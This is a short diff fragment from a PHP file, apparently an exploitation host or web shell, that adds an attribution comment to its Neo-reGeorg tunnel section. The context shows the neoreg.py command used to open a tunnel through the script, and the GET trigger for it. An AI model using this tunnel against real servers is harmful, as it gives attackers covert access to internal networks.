@@ -309,6 +309,7 @@
 
 
 	// Neo-reGeorg Tunnel
+	// Code generated from: https://github.com/L-codes/Neo-reGeorg
 	// Call using ./neoreg.py --skip -k 123456 -u http://server-address:server-port/php-host-expl.php?georg
 	if (isset($_GET['georg']))
 	{
